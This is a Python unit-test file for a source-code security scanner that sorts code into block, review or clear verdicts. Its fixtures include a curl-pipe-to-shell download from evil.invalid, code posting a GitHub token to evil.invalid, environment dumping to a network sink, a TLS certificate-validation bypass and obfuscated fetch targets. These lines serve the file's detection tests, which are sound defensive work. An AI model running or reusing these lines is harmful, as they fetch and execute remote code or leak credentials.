from __future__ import annotations

import unittest

from researcher.security_gate import (
    SecuritySeverity,
    SecurityVerdict,
    SourceArtifact,
    scan_source_artifacts,
)


class SecurityGateTests(unittest.TestCase):
    def test_empty_input_is_not_scanned_and_not_certifiable(self) -> None:
        result = scan_source_artifacts([])
        self.assertEqual(result.verdict, SecurityVerdict.NOT_SCANNED)
        self.assertEqual(result.scanned_files, 0)
        self.assertFalse(result.certification_eligible)
        self.assertFalse(result.executed_untrusted_code)

    def test_clean_source_is_clear_without_execution(self) -> None:
        artifact = SourceArtifact(
            path="lib/client.dart",
            content="class Client { String read() => 'ok'; }",
        )
        result = scan_source_artifacts([artifact])
        self.assertEqual(result.verdict, SecurityVerdict.CLEAR)
        self.assertTrue(result.certification_eligible)
        self.assertFalse(result.executed_untrusted_code)
        self.assertEqual(result.findings, ())

    def test_shell_download_execute_is_blocked(self) -> None:
        result = scan_source_artifacts(
            [SourceArtifact(path="install.sh", content="curl https://evil.invalid/payload | sh")]
        )
        self.assertEqual(result.verdict, SecurityVerdict.BLOCK)
        self.assertFalse(result.certification_eligible)
        self.assertIn(SecuritySeverity.CRITICAL, {item.severity for item in result.findings})

    def test_direct_secret_network_exfiltration_is_blocked(self) -> None:
        result = scan_source_artifacts(
            [
                SourceArtifact(
                    path="tool.py",
                    content=(
                        "GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')\n"
                        "requests.post('https://evil.invalid', data=GITHUB_TOKEN)\n"
                    ),
                )
            ]
        )
        self.assertEqual(result.verdict, SecurityVerdict.BLOCK)
        self.assertIn(
            "credential_harvesting",
            {item.rule_id for item in result.findings},
        )

    def test_github_client_auth_is_not_credential_harvesting(self) -> None:
        result = scan_source_artifacts(
            [
                SourceArtifact(
                    path=".github/workflows/triage.py",
                    content=(
                        "GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')\n"
                        "g = Github(GITHUB_TOKEN)\n"
                        "issue = g.get_repo('owner/repo').get_issue(number=1)\n"
                        "print('Posting comment')\n"
                        "issue.create_comment('hello')\n"
                    ),
                )
            ]
        )
        self.assertNotIn(
            "credential_harvesting",
            {item.rule_id for item in result.findings},
        )
        self.assertNotEqual(result.verdict, SecurityVerdict.BLOCK)

    def test_process_execution_requires_review(self) -> None:
        result = scan_source_artifacts(
            [SourceArtifact(path="tool.py", content="subprocess.run(['git', 'status'])")]
        )
        self.assertEqual(result.verdict, SecurityVerdict.REVIEW)
        self.assertFalse(result.certification_eligible)
        self.assertIn("process_execution", {item.rule_id for item in result.findings})

    def test_tls_validation_bypass_requires_high_review(self) -> None:
        result = scan_source_artifacts(
            [
                SourceArtifact(
                    path="android/Helpers.kt",
                    content=(
                        '@SuppressLint("TrustAllX509TrustManager")\n'
                        "fun acceptUntrustedCertificates() {\n"
                        "  HttpsURLConnection.setDefaultSSLSocketFactory(factory)\n"
                        "}\n"
                    ),
                )
            ]
        )
        self.assertEqual(result.verdict, SecurityVerdict.REVIEW)
        finding = next(
            item
            for item in result.findings
            if item.rule_id == "tls_certificate_validation_bypass"
        )
        self.assertEqual(finding.severity, SecuritySeverity.HIGH)

    def test_android_os_environment_is_not_secret_environment_access(self) -> None:
        result = scan_source_artifacts(
            [
                SourceArtifact(
                    path="android/Helpers.kt",
                    content=(
                        "import android.os.Environment\n"
                        "val path = Environment.getDataDirectory()\n"
                    ),
                )
            ]
        )
        self.assertEqual(result.verdict, SecurityVerdict.CLEAR)
        self.assertNotIn(
            "secret_environment_access",
            {item.rule_id for item in result.findings},
        )

    def test_benign_platform_environment_probe_is_clear(self) -> None:
        result = scan_source_artifacts(
            [
                SourceArtifact(
                    path="integration_test/app_test.dart",
                    content=(
                        "final simulator = Platform.environment"
                        ".containsKey('SIMULATOR_DEVICE_NAME');"
                    ),
                )
            ]
        )
        self.assertEqual(result.verdict, SecurityVerdict.CLEAR)
        self.assertNotIn(
            "secret_environment_access",
            {item.rule_id for item in result.findings},
        )

    def test_secret_environment_access_requires_review(self) -> None:
        result = scan_source_artifacts(
            [
                SourceArtifact(
                    path="lib/config.dart",
                    content="final key = Platform.environment['API_KEY'];",
                )
            ]
        )
        self.assertEqual(result.verdict, SecurityVerdict.REVIEW)
        self.assertFalse(result.certification_eligible)
        self.assertIn("secret_environment_access", {item.rule_id for item in result.findings})

    def test_environment_access_near_network_sink_requires_high_review(self) -> None:
        result = scan_source_artifacts(
            [
                SourceArtifact(
                    path="tool.py",
                    content=(
                        "env = os.environ\n"
                        "requests.post('https://example.invalid', json=dict(env))\n"
                    ),
                )
            ]
        )
        self.assertEqual(result.verdict, SecurityVerdict.REVIEW)
        finding = next(
            item
            for item in result.findings
            if item.rule_id == "environment_exfiltration_requires_review"
        )
        self.assertEqual(finding.severity, SecuritySeverity.HIGH)

    def test_benign_character_generation_is_not_obfuscation(self) -> None:
        result = scan_source_artifacts(
            [
                SourceArtifact(
                    path="example/lib/main.dart",
                    content=(
                        "final values = List<int>.generate(20, (_) => 65);\n"
                        "return String.fromCharCodes(values);\n"
                    ),
                )
            ]
        )
        self.assertEqual(result.verdict, SecurityVerdict.CLEAR)
        self.assertNotIn(
            "suspicious_obfuscation",
            {item.rule_id for item in result.findings},
        )

    def test_encoded_value_near_network_sink_requires_review(self) -> None:
        result = scan_source_artifacts(
            [
                SourceArtifact(
                    path="lib/client.dart",
                    content=(
                        "final target = String.fromCharCodes(encoded);\n"
                        "fetch(target);\n"
                    ),
                )
            ]
        )
        self.assertEqual(result.verdict, SecurityVerdict.REVIEW)
        self.assertIn(
            "suspicious_obfuscation",
            {item.rule_id for item in result.findings},
        )

    def test_pubspec_overrides_requires_review(self) -> None:
        result = scan_source_artifacts(
            [
                SourceArtifact(
                    path="packages/talker/pubspec_overrides.yaml",
                    content=(
                        "dependency_overrides:\n"
                        "  talker_logger:\n"
                        "    path: ../talker_logger\n"
                    ),
                )
            ]
        )
        self.assertEqual(result.verdict, SecurityVerdict.REVIEW)
        self.assertFalse(result.certification_eligible)
        finding = next(
            item
            for item in result.findings
            if item.rule_id == "pub_dependency_override_requires_review"
        )
        self.assertEqual(finding.path, "packages/talker/pubspec_overrides.yaml")

    def test_dependency_overrides_inside_pubspec_requires_review(self) -> None:
        result = scan_source_artifacts(
            [
                SourceArtifact(
                    path="pubspec.yaml",
                    content=(
                        "name: demo\n"
                        "dependencies:\n"
                        "  safe: ^1.0.0\n"
                        "dependency_overrides:\n"
                        "  safe: 1.0.1\n"
                    ),
                )
            ]
        )
        self.assertEqual(result.verdict, SecurityVerdict.REVIEW)
        self.assertIn(
            "pub_dependency_override_requires_review",
            {item.rule_id for item in result.findings},
        )


if __name__ == "__main__":
    unittest.main()
